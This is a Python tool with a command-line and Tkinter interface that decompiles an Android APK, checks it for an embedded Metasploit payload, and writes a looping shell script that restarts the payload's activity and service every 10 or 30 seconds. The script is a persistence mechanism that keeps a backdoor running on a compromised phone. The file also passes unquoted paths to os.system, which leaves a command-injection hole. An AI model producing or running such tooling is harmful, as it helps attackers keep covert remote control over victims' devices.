import re
import sys
import os
import shutil
from tkinter import *
import tkinter
from tkinter import filedialog

apk_path = "No APK selected"
apk_tool_path = "./Tools/apktool.jar"

# get the command line arguments

arg = "";

if(len(sys.argv) > 1):
    arg = sys.argv[1]

# functions

# this function run when user specified a non embedded payload
def original():
    # write a script for non embedded payload
    with open('./PersistenceScript.sh', 'w') as f:
        # android shell script to execute payload automatically 
        f.write('#!/bin/sh\n'
                'while :\n'
                'do am start --user 0 -a android.intent.action.MAIN -n com.metasploit/.MainActivity\n'
                'am startservice --user 0 com.metasploit.stage/.MainService\n'
                'am start-service --user 0 com.metasploit.stage/.MainService\n'
                'sleep 30\n'
                'done\n')

# this function run when user specified a embedded payload
def merged():
    global line
    with open('temp/AndroidManifest.xml', 'r') as find:
        lines = find.readlines()
        for temp in lines:
            if re.search(r'service', temp):
                line = temp
        result = re.search('android:name="(.*)"/>', line)
        string = result.group(1)
        res = string.rsplit('.', 2)
        with open('./PersistenceScript.sh', 'w') as f:
            f.write('#!/bin/bash\n'
                    'while :\n'
                    'do am startservice --user 0 ' +
                    res[0]+'/.'+res[1]+'.'+res[2]+'\n'
                    'am start-service --user 0 ' +
                    res[0]+'/.'+res[1]+'.'+res[2]+'\n'
                    'sleep 10\n'
                    'done')

def execute():
    # decompile the APK file and store in temp folder
    os.system(apk_tool_path + " d -f " + apk_path + " -o temp")

    exist = 'false'
    # check the APK file is embedded payload or not
    with open('temp/AndroidManifest.xml', 'r') as find:
        lines = find.readlines()
        for line in lines:
            if re.search(r'metasploit', line):
                exist = 'true'

        if exist == 'true':
            original()
        elif exist == 'false':
            merged()

    shutil.rmtree("temp")
    print("\nYour script is saved.")


# check the arguments
if arg == "" or arg == "-h" or arg == "--help" :
    # print the help menu
    print(
        'Usage : PersistenceScript <Option>\n\n'
        'Options:\n\n'
        '-h     --help  : Show this help message\n'
        '-a     --apk   : Specify the embedded payload path.\n'
        '-G     --GUI   : Start GUI version\n'
    )
elif arg == "-a" or arg == "--apk":
    # set the global apk path to the specified path
    path = ""

    # check the path is specified or not 
    if(len(sys.argv) > 2):
        path = sys.argv[2]

    if(path):
        # check the specified APK exist or not
        if(os.path.exists(path)):
            apk_path = path
            execute()
        else:
            print("No APK found at " + path)
    else: 
        print("No path specified.")
elif arg == "-G" or arg == "--GUI":

    # this function run when user click the choose APK button
    def browseAPK():
        window.filename = filedialog.askopenfilename(
            initialdir="/", title="Select APK", filetypes=(("apk", "*.apk"), ("apk", "*.apk")))
        global apk_path
        apk_path = window.filename

        apk_path_label.set("APK selected: " + window.filename)

    # starting GUI

    # create window
    window = Tk()

    # changeable GUI variable for window     
    apk_path_label = tkinter.StringVar()

    # set the default value of the GUI variable
    apk_path_label.set("No APK selected.")

    # specify the title of the window
    window.title("Persistence Script Generator")

    # create GUI components

    # create Label
    Label(window, text="Script Generator", font="none 15") .grid(
        row=1, column=0, pady=10)

    # create a button    
    button = tkinter.Button(text="Choose APK", bd=0, command=browseAPK)
    button.grid(column=0, row=2, pady=20)

    # create a Label and use GUI variable
    Label(window, textvariable=apk_path_label, anchor="center",  font="none 7") .grid(
        row=3, column=0, pady=10)

    # create a button    
    button2 = tkinter.Button(text="Generate Script", bd=0,
                            command=execute, width=50)
    button2.grid(column=0, row=5, pady=10)

     # make the window not resizable  
    window.resizable(width=False, height=False)

    # run the window
    window.mainloop()